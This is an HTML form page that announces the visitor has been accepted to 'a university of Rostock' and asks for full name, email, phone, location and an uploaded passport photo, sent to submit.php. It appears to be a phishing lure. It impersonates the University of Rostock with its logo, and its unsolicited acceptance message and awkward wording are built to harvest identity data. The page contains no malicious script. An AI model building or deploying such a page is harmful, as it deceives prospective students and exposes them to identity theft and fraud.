<!DOCTYPE html>
<html>

<head>
    <title>University Acceptance</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: url(e587449307fcab0986e92eb007df6e41.jpg);
            background-repeat: no-repeat;
            background-size: cover;
        }

        .container {
            max-width: 500px;
            padding: 20px;
            background-color: #f2f2f2;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        h3 {
            text-align: center;
        }

        .logo {
            display: block;
            width: 300px;
            margin: 0 auto 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: bold;
        }

        input[type="text"],
        input[type="tel"],
        input[type="email"],
        input[type="file"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .btn-submit {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #4c77af;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .btn-submit:hover {
            background-color: #45a049;
        }

        .message {
            text-align: center;
            margin-bottom: 20px;
        }

        /* Media Queries */
        @media only screen and (max-width: 600px) {
            .container {
                max-width: 100%;
            }

            .logo {
                width: 200px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <img class="logo" src="uni-rostock-1-720x311.webp" alt="Logo">

        <h3>Congratulations! You have been accepted to a university of Rostock.</h3>

        <p class="message">Please fill out the following information:</p>

        <form action="submit.php" method="post" enctype="multipart/form-data">
            <div class="form-group">
                <label for="full-name">Full Name:</label>
                <input type="text" id="full-name" name="full-name" required>
            </div>

            <div class="form-group">
                <label for="email">Email:</label>
                <input type="email" id="email" name="email" required>
            </div>

            <div class="form-group">
                <label for="phone">Phone:</label>
                <input type="tel" id="phone" name="phone" required>
            </div>

            <div class="form-group">
                <label for="location">Location:</label>
                <input type="text" id="location" name="location" required>
            </div>

            <div class="form-group">
                <label for="passport-photo">Upload Passport Photo:</label>
                <input type="file" id="passport-photo" name="passport-photo" accept="image/*" required>
            </div>

            <input type="submit" value="Submit" class="btn-submit">
        </form>
    </div>
</body>

</html>
